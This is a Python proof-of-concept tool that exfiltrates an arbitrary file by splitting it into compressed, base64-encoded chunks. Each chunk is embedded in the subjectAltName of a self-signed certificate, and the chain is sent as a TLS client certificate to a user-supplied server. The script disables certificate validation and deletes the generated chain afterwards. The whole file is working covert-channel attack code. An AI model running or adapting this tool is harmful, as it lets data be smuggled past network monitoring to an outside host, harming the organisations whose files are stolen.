import argparse
import base64
import lzma
import OpenSSL
import os
import random
import socket
import ssl


def parse_args():
	p = argparse.ArgumentParser()

	required = p.add_argument_group("required arguments")

	required.add_argument(
		"-f",
		"--file",
		type=argparse.FileType('rb'),
		help="file to send",
		required=True
	)

	required.add_argument(
		"-i",
		"--ip",
		type=str,
		help="server address",
		required=True
	)

	required.add_argument(
		"-p",
		"--port",
		type=int,
		help="server port",
		required=True
	)

	return p.parse_args()


def generate_cert(key, b, file_ext=None):
	cert = OpenSSL.crypto.X509()

	# Set subject of certificate
	subject = cert.get_subject()
	subject.countryName = "US"

	# Set random serial number and validity period of 1 year
	cert.set_serial_number(random.randint(1000000000, 9999999999))
	cert.gmtime_adj_notBefore(0)
	cert.gmtime_adj_notAfter(60 * 60 * 24 * 7 * 4 * 12)

	# Store the file extension and/or bytes in the subject alternative name extension
	extension = (b"DNS:" + b) if not file_ext else (b"DNS:" + bytes(file_ext, "utf-8")) + (b"DNS:" + b)
	cert.add_extensions([
		OpenSSL.crypto.X509Extension(
			b"subjectAltName", False, extension
		)
	])

	# Self sign the certificate
	cert.set_issuer(subject)
	cert.set_pubkey(key)
	cert.sign(key, "sha512")

	# Return the PEM formatting for appending to our certificate chain
	return OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, cert)


if __name__ == "__main__":
	args = parse_args()

	# Generate a 4096 bit RSA key pair
	key = OpenSSL.crypto.PKey()
	key.generate_key(OpenSSL.crypto.TYPE_RSA, 4096)

	# Output for the generated certificate chain
	output = os.path.join(os.getcwd(), "chain.pem")

	# Chunk up large files and split them into multiple certificates
	with open(output, "wb") as o:
		chunk_size = random.randint(1980, 2020)

		# Encode the first certificate in the chain with the file's extension
		first_chunk = args.file.read(2000)
		file_ext = os.path.splitext(args.file.name)[1]
		o.write(generate_cert(key, base64.b64encode(lzma.compress(first_chunk)), file_ext))

		# Compress and encode each remaining chunk in the file
		for chunk in iter(lambda: args.file.read(chunk_size), b""):
			compressed = lzma.compress(chunk)
			encoded = base64.b64encode(compressed)
			cert_out = generate_cert(key, encoded)
			o.write(cert_out)

			# Change size of the next cert
			chunk_size = random.randint(1980, 2020)

		# Export private key
		o.write(OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_PEM, key))

	# Just for this PoC, ignore the server's certificate and don't validate it
	client_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	client_context.check_hostname = False
	client_context.verify_mode = ssl.CERT_NONE

	# Send our generated certificate chain during the handshake
	client_context.load_cert_chain(output)

	# Connect to the server
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		conn = client_context.wrap_socket(sock, server_side=False)
		conn.connect((args.ip, args.port))
		print("[*] File sent")

	# Handle any possible exceptions
	except Exception as e:
		print("[!] {}".format(e))

	# Remove the created certificate chain
	finally:
		os.remove(output)
